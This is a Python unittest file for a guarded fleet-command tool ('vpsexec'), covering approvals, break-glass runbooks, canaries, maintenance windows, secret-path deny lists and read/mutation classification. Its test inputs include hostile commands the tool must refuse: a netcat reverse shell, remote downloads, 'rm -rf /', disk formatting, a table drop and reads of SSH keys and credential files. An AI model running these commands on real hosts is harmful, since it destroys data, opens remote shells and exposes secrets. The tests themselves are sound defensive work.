        self.assertEqual(self.ssh_calls, [])

    def test_break_glass_flag_without_a_runbook_refuses(self):
        with self.assertRaises(Refused) as cm:
            self._run(["@web", "systemctl restart nginx", "--break-glass",
                       "--run", "--reason", "x"],
                      runbooks=[_runbook(["web1", "web3"],
                                         "systemctl restart nginx",
                                         break_glass=False)],
                      prompt=lambda m: "BREAK-GLASS:2")
        self.assertIn("break_glass runbook", str(cm.exception))
        self.assertEqual(self.ssh_calls, [])

    def test_break_glass_needs_a_runbook_for_every_elevated_host(self):
        """Both hosts are authorised for the risky command, so the risky gate
        passes — but only web3's runbook carries break_glass, and web1 is the
        frozen one. The elevation gate must catch that on its own."""
        with self.assertRaises(Refused) as cm:
            self._run(["@web", "systemctl restart nginx", "--break-glass",
                       "--run", "--reason", "x"],
                      runbooks=[_runbook(["web3"], "systemctl restart nginx",
                                         break_glass=True),
                                _runbook(["web1"], "systemctl restart nginx",
                                         break_glass=False)],
                      prompt=lambda m: "BREAK-GLASS:2")
        self.assertIn("Missing for: web1", str(cm.exception))
        self.assertEqual(self.ssh_calls, [])

    def test_break_glass_with_a_committed_runbook_reaches_a_frozen_host(self):
        rc = self._run(["@web", "systemctl restart nginx", "--break-glass",
                        "--run", "--reason", "OPS-4471"], runbooks=self.RB,
                       prompt=lambda m: "BREAK-GLASS:2")
        self.assertEqual(rc, 0)
        self.assertEqual([h for h, c in self.ssh_calls if "systemctl" in c],
                         ["web1", "web3"])
        bg = [e for e in self.events() if e["event"] == "break_glass"]
        self.assertEqual(len(bg), 1)
        self.assertEqual(bg[0]["reason"], "OPS-4471")
        # web3 is posture 'released' and needed no elevation. Only the frozen
        # host is recorded as elevated — break-glass is per host, and minimal.
        self.assertEqual(bg[0]["hosts"], ["web1"])
        self.assertEqual(bg[0]["runbooks"], ["test.yaml"])

    def test_break_glass_does_not_override_the_master_switch_or_mode(self):
        for gov in (_policy(mutation=False), _policy(mode="lockdown")):
            self.ssh_calls = []
            with self.assertRaises(Refused):
                self._run(["@web", "systemctl restart nginx", "--break-glass",
                           "--run", "--reason", "x"], runbooks=self.RB, gov=gov,
                          prompt=lambda m: "BREAK-GLASS:2")
            self.assertEqual(self.ssh_calls, [])

    def test_break_glass_does_not_override_the_floor(self):
        """The whole point. Even a runbook cannot name one, but confirm that a
        floor command with --break-glass and a valid approval still refuses."""
        for cmd in ("docker volume prune -f", "rm -rf /", "DROP TABLE users",
                    "mkfs.ext4 /dev/sda1"):
            self.ssh_calls = []
            with self.assertRaises(Refused, msg=cmd):
                self._run(["@web", cmd, "--break-glass", "--run", "--reason", "x"],
                          runbooks=self.RB, prompt=lambda m: "BREAK-GLASS:2")
            self.assertEqual(self.ssh_calls, [], cmd)

    def test_approval_phrase_is_break_glass_not_fleet(self):
        with self.assertRaises(Refused):
            self._run(["@web", "systemctl restart nginx", "--break-glass",
                       "--run", "--reason", "x"], runbooks=self.RB,
                      prompt=lambda m: "FLEET:2")
        self.assertEqual(self.ssh_calls, [])


class ParsingTest(_Harness):
    def _run(self, argv):
        return vpsexec.dispatch(argv, guard=_guard(), policy=_yaml_policy(),
                                prober=self.prober(), ssh=self.fake_ssh(),
                                stream=ApprovalTest._NoTTY())

    def test_unquoted_command_is_refused_with_the_fix(self):
        with self.assertRaises(Refused) as cm:
            self._run(["edge1", "systemctl", "restart", "n8n"])
        self.assertIn("ONE quoted argument", str(cm.exception))

    def test_unknown_flag_refused(self):
        with self.assertRaises(Refused):
            self._run(["edge1", "ls", "--yes"])

    def test_flag_needing_a_value_refuses_when_given_none(self):
        for flag in ("--reason", "--in", "--override", "--approve", "--timeout"):
            with self.assertRaises(Refused, msg=flag):
                self._run(["edge1", "ls", flag])


if __name__ == "__main__":
    unittest.main()


# ===========================================================================
# post-conditions, canary, compare
# ===========================================================================

class _FleetHarness(_Harness):
    GROUPS = {"web": ["edge1", "web3"]}

    def run_fleet(self, argv, runbooks=None, gov=None, prompt=None, ssh=None,
                  blackout_runner=None, policy=None):
        return vpsexec.dispatch(
            argv, guard=_guard(gov or _policy(postures={
                "edge1": {"posture": "test"}, "web3": {"posture": "test"},
                "web1": {"posture": "frozen"}})),
            policy=policy or _yaml_policy(groups=self.GROUPS,
                                          runbooks=runbooks or []),
            prober=self.prober(), ssh=ssh or self.fake_ssh(),
            stream=ApprovalTest._TTY() if prompt else ApprovalTest._NoTTY(),
            prompt=prompt, today="2026-08-27",
            blackout_runner=blackout_runner or self.blackout_runner(unavailable=True))

    def capture(self, *a, **kw):
        import contextlib, io
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            rc = self.run_fleet(*a, **kw)
        return rc, buf.getvalue()


class VerifyTest(_FleetHarness):
    """rc=0 from a restart is not evidence the service works."""

    def _rb(self, verify=None):
        rb = _runbook(["edge1", "web3"], "systemctl restart nginx")
        if verify:
            rb["verify"] = verify
        return [rb]

    def _flaky_verify_ssh(self):
        def ssh(host, cmd, timeout=None, connect_timeout=None):
            self.ssh_calls.append((host, cmd))
            if "vpscfg.lock" in cmd:
                return 0, "", ""
            return (1, "", "inactive") if "is-active" in cmd else (0, "ok", "")
        return ssh

    def test_verify_runs_after_the_command_on_each_host(self):
        self.run_fleet(["edge1,web3", "systemctl restart nginx", "--run",
                        "--reason", "x", "--verify", "systemctl is-active nginx"],
                       runbooks=self._rb(), prompt=lambda m: "FLEET:2")
        self.assertEqual(self.cmds("edge1"),
                         ["systemctl restart nginx", "systemctl is-active nginx"])

    def test_verify_failure_fails_that_host(self):
        rc = self.run_fleet(["edge1,web3", "systemctl restart nginx", "--run",
                             "--reason", "x", "--verify", "systemctl is-active nginx"],
                            runbooks=self._rb(), prompt=lambda m: "FLEET:2",
                            ssh=self._flaky_verify_ssh())
        self.assertEqual(rc, 1)
        done = [e for e in self.events() if e["event"] == "mutation_complete"][0]
        self.assertEqual(sorted(done["failed"]), ["edge1", "web3"])

    def test_verify_is_skipped_when_the_command_itself_failed(self):
        rc = self.run_fleet(["edge1,web3", "systemctl restart nginx", "--run",
                             "--reason", "x", "--verify", "systemctl is-active nginx"],
                            runbooks=self._rb(), prompt=lambda m: "FLEET:2",
                            ssh=self.fake_ssh(rcs={"edge1": 1}))
        self.assertEqual(rc, 1)
        self.assertNotIn("systemctl is-active nginx", self.cmds("edge1"))
        self.assertIn("systemctl is-active nginx", self.cmds("web3"))

    def test_runbook_verify_is_used_when_no_flag_is_given(self):
        self.run_fleet(["edge1,web3", "systemctl restart nginx", "--run",
                        "--reason", "x"],
                       runbooks=self._rb(verify="curl -qsf localhost/health"),
                       prompt=lambda m: "FLEET:2")
        self.assertIn("curl -qsf localhost/health", self.cmds("edge1"))

    def test_a_post_condition_must_be_a_read(self):
        """A verify runs with no approval right after a mutation. If it could
        change anything it would be a second command past every gate."""
        for bad in ("systemctl restart nginx", "./cleanup.sh", "rm -rf ./x",
                    "curl -sfo /tmp/x http://h"):
            self.ssh_calls = []
            with self.assertRaises(Refused, msg=bad) as cm:
                self.run_fleet(["edge1,web3", "systemctl restart nginx", "--run",
                                "--reason", "x", "--verify", bad],
                               runbooks=self._rb(), prompt=lambda m: "FLEET:2")
            self.assertIn("must be unable to change anything", str(cm.exception))
            self.assertEqual(self.ssh_calls, [], bad)

    def test_verify_is_part_of_the_plan_hash(self):
        plan = vpsexec.build_plan(["edge1"], "systemctl restart nginx", {}, "risky",
                                  None, verify={"edge1": "systemctl is-active nginx"})
        bare = vpsexec.build_plan(["edge1"], "systemctl restart nginx", {}, "risky", None)
        self.assertNotEqual(vpsexec.plan_hash(plan), vpsexec.plan_hash(bare))

    def test_plan_says_so_when_there_is_no_post_condition(self):
        plan = vpsexec.build_plan(["edge1"], "./deploy.sh", {}, "mutating", None)
        self.assertIn("verify  : NONE", vpsexec.render_plan(plan, "abc"))


class CanaryTest(_FleetHarness):
    """Continue-on-error finishes the job; the canary stops a bad command from
    reaching all of them."""

    RB = [_runbook(["edge1", "web3"], "systemctl restart nginx")]

    def test_canary_failure_halts_and_leaves_the_rest_untouched(self):
        rc = self.run_fleet(["edge1,web3", "systemctl restart nginx", "--run",
                             "--reason", "x", "--canary"],
                            runbooks=self.RB, prompt=lambda m: "FLEET:2",
                            ssh=self.fake_ssh(rcs={"edge1": 1}))
        self.assertEqual(rc, 1)
        self.assertEqual(self.cmds("edge1"), ["systemctl restart nginx"])
        self.assertEqual(self.cmds("web3"), [], "web3 must not be touched")
        halted = [e for e in self.events() if e["event"] == "canary_failed"]
        self.assertEqual(halted[0]["not_run"], ["web3"])

    def test_canary_failure_can_come_from_the_post_condition(self):
        def ssh(host, cmd, timeout=None, connect_timeout=None):
            self.ssh_calls.append((host, cmd))
            if "vpscfg.lock" in cmd:
                return 0, "", ""
            return (1, "", "inactive") if "is-active" in cmd else (0, "ok", "")
        rc = self.run_fleet(["edge1,web3", "systemctl restart nginx", "--run",
                             "--reason", "x", "--canary",
                             "--verify", "systemctl is-active nginx"],
                            runbooks=self.RB, prompt=lambda m: "FLEET:2", ssh=ssh)
        self.assertEqual(rc, 1)
        self.assertEqual(self.cmds("web3"), [])

    def test_passing_canary_needs_CONTINUE_typed(self):
        answers = iter(["FLEET:2", "CONTINUE"])
        rc = self.run_fleet(["edge1,web3", "systemctl restart nginx", "--run",
                             "--reason", "x", "--canary"],
                            runbooks=self.RB, prompt=lambda m: next(answers))
        self.assertEqual(rc, 0)
        self.assertEqual(self.cmds("web3"), ["systemctl restart nginx"])

    def test_declining_continuation_leaves_the_rest_untouched(self):
        answers = iter(["FLEET:2", "no thanks"])
        with self.assertRaises(Refused) as cm:
            self.run_fleet(["edge1,web3", "systemctl restart nginx", "--run",
                            "--reason", "x", "--canary"],
                           runbooks=self.RB, prompt=lambda m: next(answers))
        self.assertIn("left untouched", str(cm.exception))
        self.assertEqual(self.cmds("web3"), [])

    def test_canary_is_refused_where_it_would_mean_nothing(self):
        with self.assertRaises(Refused) as cm:
            self.run_fleet(["edge1,web3", "df -h", "--canary"])
        self.assertIn("not reads", str(cm.exception))
        with self.assertRaises(Refused) as cm:
            self.run_fleet(["edge1", "./deploy.sh", "--run", "--reason", "x", "--canary"])
        self.assertIn("more than one host", str(cm.exception))
        with self.assertRaises(Refused) as cm:
            self.run_fleet(["edge1,web3", "./deploy.sh", "--run", "--reason", "x",
                            "--canary=2"])
        self.assertIn("no hosts behind it", str(cm.exception))

    def test_canary_is_part_of_the_plan_hash(self):
        a = vpsexec.build_plan(["edge1", "web3"], "x", {}, "mutating", None)
        b = vpsexec.build_plan(["edge1", "web3"], "x", {}, "mutating", None, canary=1)
        self.assertNotEqual(vpsexec.plan_hash(a), vpsexec.plan_hash(b))


class CompareTest(_FleetHarness):
    def test_groups_identical_output_and_flags_the_divergent_host(self):
        """Three hosts, two agreeing: the third is the odd one out."""
        def ssh(host, cmd, timeout=None, connect_timeout=None):
            self.ssh_calls.append((host, cmd))
            return 0, ("nginx/1.14.2\n" if host == "web3" else "nginx/1.18.0\n"), ""
        rc, out = self.capture(["edge1,web1,web3", "nginx -v", "--compare"], ssh=ssh)
        self.assertEqual(rc, 0)
        self.assertIn("2 distinct result", out)
        self.assertIn("divergent", out)
        divergent = [l for l in out.splitlines() if "divergent" in l][0]
        self.assertIn("web3", divergent)
        self.assertNotIn("edge1", divergent)

    def test_an_even_split_claims_no_odd_one_out(self):
        """1-vs-1 has no majority. Naming either as divergent would be a guess."""
        def ssh(host, cmd, timeout=None, connect_timeout=None):
            self.ssh_calls.append((host, cmd))
            return 0, ("nginx/1.14.2\n" if host == "web3" else "nginx/1.18.0\n"), ""
        rc, out = self.capture(["edge1,web3", "nginx -v", "--compare"], ssh=ssh)
        self.assertIn("no majority", out)
        self.assertNotIn("divergent", out)

    def test_all_agreeing_says_so(self):
        rc, out = self.capture(["edge1,web3", "nginx -v", "--compare"])
        self.assertIn("all hosts agree", out)

    def test_compare_is_refused_for_mutations(self):
        with self.assertRaises(Refused) as cm:
            self.run_fleet(["edge1,web3", "./deploy.sh", "--run", "--reason", "x",
                            "--compare"])
        self.assertIn("hide failures", str(cm.exception))


# ===========================================================================
# blackout, repeat guard, secrets, introspection
# ===========================================================================

class BlackoutTest(_FleetHarness):
    def test_advisory_only_by_default(self):
        """Outside a window must never block; inside must never grant."""
        rc = self.run_fleet(["edge1,web3", "./deploy.sh", "--run", "--reason", "x"],
                            prompt=lambda m: "FLEET:2",
                            blackout_runner=self.blackout_runner(active=[]))
        self.assertEqual(rc, 0)

    def test_require_refuses_hosts_outside_a_window(self):
        with self.assertRaises(Refused) as cm:
            self.run_fleet(["edge1,web3", "./deploy.sh", "--run", "--reason", "x",
                            "--require-blackout"], prompt=lambda m: "FLEET:2",
                           blackout_runner=self.blackout_runner(active=["edge1"]))
        self.assertIn("not in an active maintenance window", str(cm.exception))
        self.assertIn("web3", str(cm.exception))
        self.assertEqual(self.cmds(), [])

    def test_require_passes_when_every_host_is_in_a_window(self):
        rc = self.run_fleet(["edge1,web3", "./deploy.sh", "--run", "--reason", "x",
                             "--require-blackout"], prompt=lambda m: "FLEET:2",
                            blackout_runner=self.blackout_runner(active=["edge1", "web3"]))
        self.assertEqual(rc, 0)

    def test_require_fails_closed_when_the_tool_is_unavailable(self):
        for runner in (self.blackout_runner(unavailable=True),
                       self.blackout_runner(broken=True)):
            self.ssh_calls = []
            with self.assertRaises(Refused) as cm:
                self.run_fleet(["edge1,web3", "./deploy.sh", "--run", "--reason",
                                "x", "--require-blackout"],
                               prompt=lambda m: "FLEET:2", blackout_runner=runner)
            self.assertIn("unverifiable maintenance window", str(cm.exception))
            self.assertEqual(self.cmds(), [])

    def test_a_window_cannot_grant_what_posture_refuses(self):
        """An open blackout on a frozen host is still a frozen host."""
        with self.assertRaises(Refused) as cm:
            self.run_fleet(["web1", "./deploy.sh", "--run", "--reason", "x"],
                           policy=_yaml_policy(groups={"web": ["web1"]}),
                           prompt=lambda m: "web1",
                           blackout_runner=self.blackout_runner(active=["web1"]))
        self.assertIn("posture", str(cm.exception))

    def test_require_blackout_is_meaningless_for_reads(self):
        with self.assertRaises(Refused):
            self.run_fleet(["edge1", "df -h", "--require-blackout"])


class RepeatGuardTest(_FleetHarness):
    ARGS = ["edge1,web3", "./deploy.sh", "--run", "--reason", "OPS-1"]

    def test_interactive_repeat_warns_but_proceeds(self):
        self.run_fleet(self.ARGS, prompt=lambda m: "FLEET:2")
        rc, out = self.capture(self.ARGS, prompt=lambda m: "FLEET:2")
        self.assertEqual(rc, 0)
        self.assertIn("IDENTICAL plan ran", out)

    def test_unattended_repeat_is_refused(self):
        """A script re-firing the same mutation is more likely a bug than intent."""
        _, out = self.capture(["edge1,web3", "./deploy.sh", "--reason", "OPS-1"])
        digest = [l.split()[-1] for l in out.splitlines()
                  if l.startswith("plan-hash:")][0]
        self.run_fleet(self.ARGS + ["--approve=" + digest])
        with self.assertRaises(Refused) as cm:
            self.run_fleet(self.ARGS + ["--approve=" + digest])
        self.assertIn("unattended repeat", str(cm.exception))

    def test_a_different_plan_is_not_a_repeat(self):
        self.run_fleet(self.ARGS, prompt=lambda m: "FLEET:2")
        rc = self.run_fleet(["edge1,web3", "./other.sh", "--run", "--reason", "OPS-1"],
                            prompt=lambda m: "FLEET:2")
        self.assertEqual(rc, 0)

    def test_reads_are_never_repeat_guarded(self):
        for _ in range(3):
            self.assertEqual(self.run_fleet(["edge1,web3", "df -h"]), 0)


@unittest.skipUnless(vpsexecpolicy._HAVE_YAML, "PyYAML unavailable")
class SecretPathTest(_Harness):
    """The credential-path deny list (SECRETS_POLICY), as an estate ships it."""

    OVERRIDE = (
        "version: 1\n"
        'expires: "2999-01-01"\n'
        'reason: "please"\n'
        "allow:\n"
        "  - hosts: [edge1]\n"
        '    cmd: "cat /opt/app/.env.production"\n'
        "    where: host\n"
        '    why: "i need it"\n'
    )

    def _deny(self):
        pol = vpsexecpolicy.load(SECRETS_POLICY, deny_patterns=DENY)
        return DENY + pol["deny_extra"]

    def test_credential_paths_are_refused_even_as_reads(self):
        deny = self._deny()
        for cmd in ("cat /opt/app/.env.production",
                    "grep API_KEY /srv/x/.env.production",
                    "cat /root/.ssh/id_rsa", "cat /var/lib/pgsql/.pgpass",
                    "cat ~/.config/vpscfgfarm/telemetry-key", "cat /etc/ssl/x.pem",
                    "cat /etc/inventory-agent/key", "head -c 8 /etc/inventory-agent/key"):
            with self.assertRaises(Refused, msg=cmd):
                vpsexec.classify(cmd, deny)

    def test_no_override_can_lift_a_secret_path(self):
        with self.assertRaises(Refused) as cm:
            vpsexec.load_override(_write(self.OVERRIDE), self._deny(),
                                  today="2026-08-27")
        self.assertIn("tampered", str(cm.exception))

    def test_service_names_are_not_collateral_damage(self):
        deny = self._deny()
        for ok in ("docker logs secretsvc-prod", "systemctl status vault",
                   "ls /opt", "docker ps"):
            self.assertEqual(vpsexec.classify(ok, deny)[0], "read", ok)


class BundledShortFlagTest(unittest.TestCase):
    """A reverse shell must not classify as a read."""

    def test_bundled_flags_do_not_evade_disqualifiers(self):
        for cmd in ("curl -sfo /tmp/x http://h", "nc -le /bin/sh 10.0.0.1 4444",
                    "wget -qO /tmp/x http://h"):
            self.assertNotEqual(vpsexec.classify(cmd, DENY)[0], "read", cmd)

    def test_ordinary_bundled_flags_still_read(self):
        # grep -rn over /etc is refused (tests/test_tree_reads.py):
        # a recursive read of /etc prints every credential under it.
        for cmd in ("ls -la /opt", "grep -rn foo /var/log/nginx", "tail -n 50 /var/log/x",
                    "curl -qsf localhost/health", "df -h"):
            self.assertEqual(vpsexec.classify(cmd, DENY)[0], "read", cmd)


class IntrospectionTest(_Harness):
    GROUPS = {"web": ["edge1", "web3"]}

    def _run(self, argv, gov=None):
        import contextlib, io
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            rc = vpsexec.dispatch(
                argv, guard=_guard(gov), prober=self.prober(), ssh=self.fake_ssh(),
                policy=_yaml_policy(groups=self.GROUPS,
                                    runbooks=[_runbook(["edge1"], "systemctl restart x",
                                                       break_glass=True)]),
                blackout_runner=self.blackout_runner(unavailable=True))
        return rc, buf.getvalue()

    def test_groups_lists_members(self):
        rc, out = self._run(["groups"])
        self.assertEqual(rc, 0)
        self.assertIn("@web", out)
        self.assertIn("edge1, web3", out)

    def test_hosts_shows_posture_and_mutability(self):
        rc, out = self._run(["hosts"])
        self.assertIn("POSTURE", out)
        self.assertIn("edge1", out)
        self.assertIn("frozen", out)

    def test_runbooks_lists_what_is_in_force(self):
        rc, out = self._run(["runbooks"])
        self.assertIn("systemctl restart x", out)
        self.assertIn("BREAK-GLASS", out)

    def test_runbooks_says_plainly_when_nothing_is_authorised(self):
        import contextlib, io
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            vpsexec.dispatch(["runbooks"], guard=_guard(), policy=_yaml_policy(),
                             prober=self.prober(), ssh=self.fake_ssh())
        self.assertIn("no runbooks in force", buf.getvalue())

    def test_locks_reads_every_host(self):
        rc, out = self._run(["locks", "@web"])
        self.assertEqual(sorted(h for h, _ in self.ssh_calls), ["edge1", "web3"])
        self.assertIn("LOCK", out)

    def test_log_filters_by_reason(self):
        journal.append("vpsexec", {"event": "mutation_attempt", "hosts": ["edge1"],
                                   "command": "x", "reason": "OPS-4471"})
        journal.append("vpsexec", {"event": "mutation_attempt", "hosts": ["edge1"],
                                   "command": "y", "reason": "ROUTINE"})
        rc, out = self._run(["log", "--reason", "ops-4471"])
        self.assertIn("OPS-4471", out)
        self.assertNotIn("ROUTINE", out)

    def test_a_host_named_like_a_verb_is_refused(self):
        gov = _policy()
        gov["hosts"]["log"] = {"posture": "test"}
        with self.assertRaises(Refused) as cm:
            self._run(["groups"], gov=gov)
        self.assertIn("reserved vpsexec verb", str(cm.exception))


class JournalQueryTest(_Harness):
    def test_since_parsing(self):
        self.assertEqual(vpsexec._parse_since("90s"), 90)
        self.assertEqual(vpsexec._parse_since("2h"), 7200)
        self.assertEqual(vpsexec._parse_since("7d"), 604800)
        with self.assertRaises(Refused):
            vpsexec._parse_since("soon")

    def test_query_filters_and_missing_journal_is_empty(self):
        self.assertEqual(vpsexeclog.read(), [])
        journal.append("vpsexec", {"event": "read", "hosts": ["edge1"], "command": "df"})
        journal.append("vpsexec", {"event": "refused", "reason": "nope"})
        self.assertEqual(len(vpsexeclog.query(vpsexeclog.read(), event="read")), 1)
        self.assertEqual(len(vpsexeclog.query(vpsexeclog.read(), host="edge1")), 1)
        self.assertEqual(len(vpsexeclog.query(vpsexeclog.read(), host="web3")), 0)

    def test_corrupt_lines_are_counted_not_silently_dropped(self):
        journal.append("vpsexec", {"event": "read", "hosts": ["edge1"]})
        with open(Path(self.tmp.name) / "vpsexec.jsonl", "a") as f:
            f.write("{not json\n")
        self.assertTrue(any(r["event"] == "_unparseable" for r in vpsexeclog.read()))


# ===========================================================================
# checks — named read plays
# ===========================================================================

def _check(cmd, hosts="@all", compare=False, why="test"):
    return {"name": "t", "cmd": cmd, "why": why, "hosts": hosts,
            "compare": compare, "source": "test.yaml"}


class ChecksTest(_Harness):
    GROUPS = {"web": ["edge1", "web3"]}

    def _run(self, argv, checks=None, gov=None):
        import contextlib, io
        pol = _yaml_policy(groups=self.GROUPS)
        pol["checks"] = checks or {}
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            rc = vpsexec.dispatch(
                argv, guard=_guard(gov), policy=pol, prober=self.prober(),
                ssh=self.fake_ssh(), stream=ApprovalTest._NoTTY(),
                blackout_runner=self.blackout_runner(unavailable=True))
        return rc, buf.getvalue()

    def test_check_runs_its_command_on_its_default_hosts(self):
        rc, out = self._run(["check", "disk"],
                            checks={"disk": _check("df -h", hosts="@web")})
        self.assertEqual(rc, 0)
        self.assertEqual(sorted(h for h, _ in self.ssh_calls), ["edge1", "web3"])
        self.assertEqual(self.cmds("edge1"), ["df -h"])

    def test_host_argument_overrides_the_default(self):
        self._run(["check", "disk", "edge1"],
                  checks={"disk": _check("df -h", hosts="@web")})
        self.assertEqual([h for h, _ in self.ssh_calls], ["edge1"])

    def test_compare_default_is_applied(self):
        rc, out = self._run(["check", "v"],
                            checks={"v": _check("nginx -v", hosts="@web",
                                                compare=True)})
        self.assertIn("COMPARE", out)

    def test_a_mutating_check_is_refused_not_run(self):
        """A check runs with no --run and no approval. One that could mutate
        would be a hole, not a convenience."""
        for cmd in ("systemctl restart nginx", "./deploy.sh",
                    "journalctl --vacuum-size=200M", "rm -rf ./x"):
            self.ssh_calls = []
            with self.assertRaises(Refused, msg=cmd) as cm:
                self._run(["check", "bad"], checks={"bad": _check(cmd)})
            self.assertIn("not a read", str(cm.exception))
            self.assertEqual(self.ssh_calls, [], cmd)

    def test_a_check_cannot_reach_the_floor_or_a_secret(self):
        for cmd in ("docker volume prune", "rm -rf /"):
            self.ssh_calls = []
            with self.assertRaises(Refused, msg=cmd):
                self._run(["check", "bad"], checks={"bad": _check(cmd)})
            self.assertEqual(self.ssh_calls, [], cmd)

    def test_unknown_check_lists_what_exists(self):
        with self.assertRaises(Refused) as cm:
            self._run(["check", "nope"], checks={"disk": _check("df -h")})
        self.assertIn("disk", str(cm.exception))

    def test_bare_check_lists_them(self):
        rc, out = self._run(["check"], checks={"disk": _check("df -h")})
        self.assertEqual(rc, 0)
        self.assertIn("df -h", out)
        self.assertEqual(self.ssh_calls, [])

    def test_checks_verb_lists_them_too(self):
        rc, out = self._run(["checks"], checks={"disk": _check("df -h")})
        self.assertIn("df -h", out)


class ReadHeadFlagTest(unittest.TestCase):
    """Read-only heads that carry a destructive flag are not reads.

    Every one of these was a real hole: a read needs no --run, no --reason and
    no approval, and runs on frozen hosts.
    """

    DESTRUCTIVE = [
        "journalctl --vacuum-size=200M",   # deletes log history
        "journalctl --vacuum-time=2d",
        "journalctl --rotate",
        "dmesg -C",                        # clears evidence mid-incident
        "dmesg --clear",
        "ss -K dst 192.0.2.4",               # forcibly closes sockets
        "ping -f target",                  # flood
        "env -i /bin/sh",                  # arbitrary shell
        "env FOO=1 /bin/sh",
        "sort --compress-program=/bin/sh f",
        "curl -sfo /tmp/x http://h",
        "nc -le /bin/sh 10.0.0.1 4444",    # reverse shell
        "find /opt -delete",
    ]

    HARMLESS = [
        "journalctl -u nginx -n 50", "journalctl --disk-usage", "dmesg -T",
        "ss -lntup", "ping -c 3 host", "printenv PATH", "sort -h file",
        "df -h -x tmpfs", "curl -qsf localhost/health", "find /opt -name x",
    ]

    def test_destructive_flags_are_never_reads(self):
        for cmd in self.DESTRUCTIVE:
            self.assertNotEqual(vpsexec.classify(cmd, DENY)[0], "read", cmd)

    def test_harmless_forms_stay_reads(self):
        for cmd in self.HARMLESS:
            self.assertEqual(vpsexec.classify(cmd, DENY)[0], "read", cmd)

    def test_env_is_not_on_the_allowlist_at_all(self):
        """`env` can execute anything; `printenv` cannot."""
        self.assertNotIn("env", vpsexec.READ_ONLY_HEADS)
        self.assertIn("printenv", vpsexec.READ_ONLY_HEADS)


class SafeRedirectTest(unittest.TestCase):
    """Discarding output cannot write a file; anything else can."""

    def test_discards_are_allowed_in_reads(self):
        for cmd in ("cat /etc/inetd.conf 2>/dev/null",
                    "ls -la /etc/xinetd.d 2>/dev/null",
                    "df -h 2>&1", "systemctl status nginx 2>&1",
                    "du -xh /var 2>/dev/null | sort -h | tail -5"):
            self.assertEqual(vpsexec.classify(cmd, DENY)[0], "read", cmd)

    def test_any_other_redirection_is_a_mutation(self):
        for cmd in ("echo pwned > /etc/cron.d/x", "cat /etc/hosts >> /tmp/x",
                    "echo x >/tmp/y", "ls > /tmp/listing"):
            self.assertEqual(vpsexec.classify(cmd, DENY)[0], "mutating", cmd)

    def test_ampersand_in_a_redirection_does_not_split_the_command(self):
        self.assertEqual(vpsexec.split_segments("df -h 2>&1"), ["df -h 2>&1"])
        self.assertEqual(vpsexec.split_segments("a & b"), ["a", "b"])

    def test_a_backgrounded_risky_segment_is_still_caught(self):
        self.assertEqual(vpsexec.classify("ls & rm -rf ./x", DENY)[0], "risky")


class JournalDurabilityTest(_Harness):
    """The journal is gitignored by design and telemetry is best-effort. Both
    are right, and together they meant every mutation lived in one unbacked
    local file while nothing ever said so.

    The governor names a telemetry endpoint here (whatever the estate's own
    governor says), so the key is the only variable."""

    def setUp(self):
        super().setUp()
        from vpscfg import integrations
        patcher = mock.patch.object(integrations, "telemetry_url",
                                    lambda governor=None: "https://telemetry.example.com/v1")
        patcher.start()
        self.addCleanup(patcher.stop)

    def test_telemetry_reports_no_key_instead_of_silently_no_opping(self):
        from vpscfg import telemetry as t
        real = t._key
        try:
            t._key = lambda: None
            state, detail = t.status()
            self.assertEqual(state, "no-key")
            self.assertIn("LOCAL ONLY", detail)
            t._key = lambda: "k"
            self.assertEqual(t.status()[0], "configured")
        finally:
            t._key = real

    def test_durability_line_names_the_gap_and_the_fix(self):
        from vpscfg import telemetry as t
        real = t._key
        try:
            t._key = lambda: None
            line = vpsexeclog.durability(47)
            self.assertIn("LOCAL ONLY", line)
            self.assertIn("47", line)
            self.assertIn("--export", line)
            t._key = lambda: "k"
            self.assertIn("control plane", vpsexeclog.durability(47))
        finally:
            t._key = real

    def test_export_strips_command_output(self):
        """500 chars of a config dump is still 500 chars off that host."""
        recs = [{"ts": "2026-08-27T19:00:00+0000", "event": "step", "host": "edge1",
                 "rc": 0, "command": "systemctl status x",
                 "detail": "TOKEN=abc123 plus a config dump",
                 "verify_detail": "more output"}]
        out = vpsexeclog.export(recs)[0]
        for field in ("detail", "verify_detail"):
            self.assertIn("<redacted", out[field])
            self.assertNotIn("abc123", out[field])
        # The audit skeleton survives — that is the whole point.
        for keep in ("ts", "event", "host", "rc", "command"):
            self.assertEqual(out[keep], recs[0][keep])

    def test_export_raw_keeps_output_for_local_inspection(self):
        # Output is kept; secret VALUES in it are still masked (secretmask).
        recs = [{"event": "step", "detail": "disk ok TOKEN=abc123"}]
        detail = vpsexeclog.export(recs, redact=False)[0]["detail"]
        self.assertIn("disk ok TOKEN=", detail)
        self.assertNotIn("abc123", detail)

    def test_export_does_not_mutate_the_records_it_was_given(self):
        recs = [{"event": "step", "detail": "secret"}]
        vpsexeclog.export(recs)
        self.assertEqual(recs[0]["detail"], "secret")

    def test_log_export_emits_parseable_json(self):
        import contextlib, io, json as _json
        journal.append("vpsexec", {"event": "mutation_attempt", "hosts": ["edge1"],
                                   "command": "x", "reason": "OPS-9",
                                   "detail": "sensitive output"})
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            vpsexec.dispatch(["log", "--export"], guard=_guard(),
                             policy=_yaml_policy(), prober=self.prober(),
                             ssh=self.fake_ssh())
        payload = _json.loads(buf.getvalue())
        self.assertTrue(any(r.get("reason") == "OPS-9" for r in payload))
        self.assertFalse(any("sensitive output" == r.get("detail") for r in payload))


class KubectlReadCoverageTest(unittest.TestCase):
    """Remote kubectl read coverage: the added read verbs must
    classify as reads, and exec/cp/port-forward must NOT — they run code in /
    write to / tunnel out of a pod, like `docker exec`."""

    def test_new_read_verbs_are_reads(self):
        for cmd in ("kubectl events", "kubectl auth can-i get pods",
                    "kubectl cluster-info", "kubectl api-versions",
                    "kubectl config get-contexts",
                    "kubectl config current-context",
                    "k3s kubectl events", "k3s kubectl auth can-i create pods",
                    "k3s kubectl cluster-info"):
            self.assertEqual(vpsexec.classify(cmd, DENY)[0], "read", cmd)

    def test_diff_requires_authorization_because_it_can_execute_a_helper(self):
        for cmd in ('kubectl diff -f x.yaml', 'k3s kubectl diff -f x.yaml'):
            self.assertNotEqual(vpsexec.classify(cmd, DENY)[0], 'read')

    def test_exec_cp_portforward_are_not_reads(self):
        for cmd in ("kubectl exec pod -- sh", "k3s kubectl exec pod -- sh",
                    "kubectl cp x pod:/y", "kubectl port-forward svc/x 8080",
                    "k3s kubectl port-forward svc/x 8080"):
